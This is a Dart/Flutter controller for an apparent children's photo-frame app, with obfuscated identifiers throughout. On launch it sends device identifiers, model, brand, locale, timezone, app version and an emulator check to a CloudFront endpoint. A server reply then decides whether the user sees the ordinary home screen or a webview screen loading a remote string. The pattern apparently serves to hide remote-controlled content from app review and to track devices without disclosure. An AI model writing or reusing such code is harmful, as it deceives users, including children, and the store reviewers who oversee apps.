import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class KiddyFrameMindLogic extends GetxController {

  var dqghcwmtoz = RxBool(false);
  var elkzpmsdy = RxBool(true);
  var dpqamyu = RxString("");
  var anumsbpt = RxBool(false);
  var jfap = RxBool(true);
  final wcuofzagvp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dbxjwyh();
  }


  Future<void> dbxjwyh() async {
    anumsbpt.value = true;
    jfap.value = true;
    elkzpmsdy.value = false;

    wcuofzagvp.post("https://d3a96mtcun55c5.cloudfront.net/yaregcnwvsflqtmo",data: await vpyocw()).then((value) {
      var jzwls = value.data["jzwls"] as String;
      var yorsajtm = value.data["yorsajtm"] as bool;
      if (yorsajtm) {
        dpqamyu.value = jzwls;
        ktosbz();
      } else {
        ykfzxb();
      }
    }).catchError((e) {
      elkzpmsdy.value = true;
      jfap.value = true;
      anumsbpt.value = false;
    });
  }

  Future<Map<String, dynamic>> vpyocw() async {
    final DeviceInfoPlugin wypx = DeviceInfoPlugin();
    PackageInfo lsxedm_whbucjsf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nyuzqe = Platform.localeName;
    var aqpj = currentTimeZone;

    var dluznjrg = lsxedm_whbucjsf.packageName;
    var fjgrln = lsxedm_whbucjsf.version;
    var mjtia = lsxedm_whbucjsf.buildNumber;

    var vnels = lsxedm_whbucjsf.appName;
    var xlmr = "";
    var lzcyar  = "";
    var kqjbenix = "";
    var icslhog = "";
    var fytnrmv = "";
    var dszjhm = "";
    var xmge = "";
    var gzfnrji = "";
    var wbgv = "";
    var vqzf = "";


    var rsjc = "";
    var zyqoni = false;

    if (GetPlatform.isAndroid) {
      rsjc = "android";
      var drafvstl = await wypx.androidInfo;

      kqjbenix = drafvstl.brand;

      xlmr  = drafvstl.model;
      lzcyar = drafvstl.id;

      zyqoni = drafvstl.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      rsjc = "ios";
      var lsiytvkpbj = await wypx.iosInfo;
      kqjbenix = lsiytvkpbj.name;
      xlmr = lsiytvkpbj.model;

      lzcyar = lsiytvkpbj.identifierForVendor ?? "";
      zyqoni  = lsiytvkpbj.isPhysicalDevice;
    }
    var res = {
      "vnels": vnels,
      "dszjhm" : dszjhm,
      "fjgrln": fjgrln,
      "dluznjrg": dluznjrg,
      "xlmr": xlmr,
      "xmge" : xmge,
      "aqpj": aqpj,
      "kqjbenix": kqjbenix,
      "lzcyar": lzcyar,
      "nyuzqe": nyuzqe,
      "rsjc": rsjc,
      "zyqoni": zyqoni,
      "mjtia": mjtia,
      "icslhog" : icslhog,
      "fytnrmv" : fytnrmv,
      "gzfnrji" : gzfnrji,
      "wbgv" : wbgv,
      "vqzf" : vqzf,

    };
    return res;
  }

  Future<void> ykfzxb() async {
    Get.offNamed("/kiddy_frame_home");
  }

  Future<void> ktosbz() async {
    Get.offNamed("/kiddy_frame_photo_process");
  }

}
